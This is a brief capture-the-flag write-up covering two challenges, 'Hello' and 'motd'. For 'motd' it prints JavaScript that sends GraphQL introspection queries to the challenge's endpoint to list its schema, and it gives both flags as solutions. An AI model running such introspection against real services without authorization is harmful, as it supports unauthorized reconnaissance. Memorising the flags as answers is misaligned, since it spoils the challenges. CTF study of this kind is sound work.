## Hello
Follow directions, http://dctf21.larry.science:5003/hello.py <br>
`ctf{organize_your_folders_d650b010}`

## motd
Used https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/
```
fetch('/graphql', {
    headers: {
        'Content-Type': 'application/json'
    },
    method: 'POST',
    body: JSON.stringify({
        query: '{__schema { types { name } } }'
    })
})
.then(res => res.json())
.then(({ data }) => {
    console.log(data);
})

fetch('/graphql', {
    headers: {
        'Content-Type': 'application/json'
    },
    method: 'POST',
    body: JSON.stringify({
        query: '{ __type(name: "ctf") { name fields { name type { name kind}}}}'
    })
})
.then(res => res.json())
.then(({ data }) => {
    console.log(data)
    document.getElementById('motd').innerText = data['motd'];
})
```
`ctf{graphql_makes_rec0n_easy_c237d2a3}`